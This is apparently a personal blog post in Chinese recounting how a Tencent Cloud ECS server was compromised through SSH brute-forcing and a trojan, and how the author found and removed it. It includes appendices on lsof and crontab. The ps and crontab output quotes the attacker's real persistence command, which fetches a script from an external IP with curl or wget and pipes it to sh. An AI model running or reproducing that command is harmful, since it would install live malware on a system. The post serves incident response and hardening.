---
title: ECS遭遇安全攻击的一次经历
date: 2019-05-04 20:11:03
tags:
---

突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！

## 服务器的问题表现

{% asset_img alert-0.png 腾讯云的警告信息汇总%}

- 登录ECS服务器，用`top`命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中`/tmp/vThHH`严重消耗资源，确认中招了！

{% asset_img alert-1.png SSH暴力破解的警告信息%}

- 服务器的root口令没有变化，但登录成功时提示有几百个`failed login attempts`，说明SSH口令已经被暴力破解

## 系统检查的主要工作

主要从以下几个方面入手：

1. 检查网络服务

    使用`netstat -nlp`，发现除了22，80，443端口，还对外暴露了可疑的7946端口，调用者是`/tmp/vThHH`。

2. 检查系统进程

    通过`ps -ef`命令，跟踪可疑进程`/tmp/vThHH`，发现父进程就是木马程序`/usr/bin/ybznfa2`。
    进一步检查，发现了木马的加载进程。

    ``` bash
    root      4365   736  0 18:30 ?        00:00:00 /usr/sbin/CROND -n
    root      4366  4365  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh
    root      4367  4366  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) |sh
    ```

3. 检查cron任务

该木马由crond启动，通过`crontab -u root -l`检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！

    ``` bash
    */15 * * * * (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -fsSL -m180 http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh
    ```

## 该木马的工作原理

- 通过网络爬虫等手段收集服务器域名信息
- 以服务器默认的root用户，通过ssh暴力破解获得口令
- 通过ssh登录，添加cron定时任务，从远端服务器下载木马程序，并存放在多个目录下
- 后台启动木马，打开自定义端口进行远程控制

## 处理措施

- 手工清理cron的任务清单
- 手工杀死`/tmp/vThHH`，`/usr/bin/ybznfa2`等可疑进程
- 手工删除上述木马程序
- 检查系统进程、网络服务、定时任务等状态，确认问题解决

## 如何彻底解决SSH暴力破解的威胁？

最有效的方法就是，关闭口令登录方式，改为密钥登录，请参见下一片文章。

***应该说，腾讯云提供的安全服务还是比较有效的，赞一个！***

---

## 附录1: 关于lsof命令

查看被占用端口的归属进程，可用使用`lsof -i:<port>`命令。

``` bash
[root@VM_0_17_centos log]# lsof -i:80
COMMAND PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nginx   936  root    6u  IPv4  15296      0t0  TCP *:http (LISTEN)
nginx   937 nginx    6u  IPv4  15296      0t0  TCP *:http (LISTEN)
```

查看某个进程使用的系统资源信息，包括文件、端口等，可以使用`lsof -p <pid>` 命令。

``` bash
[root@VM_0_17_centos log]# lsof -p 527
COMMAND   PID USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME
YDService 527 root  cwd       DIR              253,1     4096 525988 /usr/local/qcloud/YunJing/YDEyes
YDService 527 root  rtd       DIR              253,1     4096      2 /
YDService 527 root  txt       REG              253,1  5194952 525989 /usr/local/qcloud/YunJing/YDEyes/YDService
YDService 527 root  mem       REG              253,1    68192 266804 /usr/lib64/libbz2.so.1.0.6
YDService 527 root  mem       REG              253,1   157424 266780 /usr/lib64/liblzma.so.5.2.2
YDService 527 root  mem       REG              253,1    90248 265916 /usr/lib64/libz.so.1.2.7
YDService 527 root  mem       REG              253,1    99944 266803 /usr/lib64/libelf-0.170.so
YDService 527 root  mem       REG              253,1    19896 266044 /usr/lib64/libattr.so.1.1.0
YDService 527 root  mem       REG              253,1   297360 274746 /usr/lib64/libdw-0.170.so
YDService 527 root  mem       REG              253,1    20032 266047 /usr/lib64/libcap.so.2.22
YDService 527 root  mem       REG              253,1    86544 274509 /usr/lib64/libnss_myhostname.so.2
YDService 527 root  mem       REG              253,1   106848 265653 /usr/lib64/libresolv-2.17.so
YDService 527 root  mem       REG              253,1    31824 265641 /usr/lib64/libnss_dns-2.17.so
YDService 527 root  mem       REG              253,1    62184 265643 /usr/lib64/libnss_files-2.17.so
YDService 527 root  mem       REG              253,1  2173512 265625 /usr/lib64/libc-2.17.so
YDService 527 root  mem       REG              253,1    88720 262170 /usr/lib64/libgcc_s-4.8.5-20150702.so.1
YDService 527 root  mem       REG              253,1  1139680 265633 /usr/lib64/libm-2.17.so
YDService 527 root  mem       REG              253,1   995840 265950 /usr/lib64/libstdc++.so.6.0.19
YDService 527 root  mem       REG              253,1    19776 265631 /usr/lib64/libdl-2.17.so
YDService 527 root  mem       REG              253,1   144792 265651 /usr/lib64/libpthread-2.17.so
YDService 527 root  mem       REG              253,1    44448 265655 /usr/lib64/librt-2.17.so
YDService 527 root  mem       REG              253,1   164240 265618 /usr/lib64/ld-2.17.so
YDService 527 root    0w      REG              253,1   227581 525140 /usr/local/qcloud/YunJing/log/ydservice.20190505.log
YDService 527 root    1u      CHR                1,3      0t0   5078 /dev/null
YDService 527 root    2u  a_inode               0,10        0   5074 [eventpoll]
YDService 527 root    3uW     REG               0,19        3  13104 /run/YDService.pid
YDService 527 root    4u     IPv4              17010      0t0    TCP VM_0_17_centos:45598->169.254.0.55:lsi-bobcat (ESTABLISHED)
YDService 527 root    5u     unix 0xffff8da7babcec00      0t0  17082 /usr/local/yd.socket.server
YDService 527 root    6u  a_inode               0,10        0   5074 [timerfd]
YDService 527 root    7r  a_inode               0,10        0   5074 inotify
YDService 527 root    8u  a_inode               0,10        0   5074 [timerfd]
YDService 527 root    9u  a_inode               0,10        0   5074 [timerfd]
YDService 527 root   10u  a_inode               0,10        0   5074 [timerfd]
YDService 527 root   11u  a_inode               0,10        0   5074 [timerfd]
YDService 527 root   24u     unix 0xffff8da7bb51fc00      0t0  17639 /usr/local/yd.socket.server
```

## 附录2：关于crontab命令

- crond是常用的木马启动入口，主要的配置文件存放在 `/var/spool/cron/`目录下。

``` bash
[root@VM_0_17_centos etc]# ls -l /var/spool/cron
总用量 4
drwxr-xr-x 2 root root 4096 4月  18 20:58 crontabs
-rw------- 1 root root    0 5月   5 11:10 root
```

- 也可能存放在`/etc/cron.d/`等类似目录下。

``` bash
[root@VM_0_17_centos etc]# ls -lF /etc |grep cron
-rw-------.  1 root root      541 4月  11 2018 anacrontab
drwxr-xr-x.  2 root root     4096 4月  30 16:47 cron.d/
drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.daily/
-rw-------.  1 root root        0 4月  11 2018 cron.deny
drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.hourly/
drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.monthly/
-rw-r--r--.  1 root root      451 6月  10 2014 crontab
drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.weekly/
```

- cron的运行日志保存在`/var/log/cron`文件中，内容格式为

``` bash
[root@VM_0_17_centos log]# head /var/log/cron

Dec 21 09:11:35 VM_0_17_centos crontab[1627]: (root) LIST (root)
Dec 21 09:11:35 VM_0_17_centos crontab[1626]: (root) REPLACE (root)
Dec 21 09:11:42 VM_0_17_centos crontab[1698]: (root) LIST (root)
Dec 21 09:11:42 VM_0_17_centos crontab[1702]: (root) LIST (root)
Dec 21 09:11:42 VM_0_17_centos crontab[1701]: (root) REPLACE (root)
Dec 21 09:11:42 VM_0_17_centos crontab[1728]: (root) LIST (root)
Dec 21 09:11:42 VM_0_17_centos crontab[1730]: (root) REPLACE (root)
Dec 21 09:12:02 VM_0_17_centos CROND[1811]: (root) CMD (/usr/local/qcloud/stargate/admin/start.sh > /dev/null 2>&1 &)
Dec 21 09:12:32 VM_0_17_centos crond[739]: (CRON) INFO (Shutting down)
```

- [crontab配置方法的参考文档](http://www.cnblogs.com/longjshz/p/5779215.html)
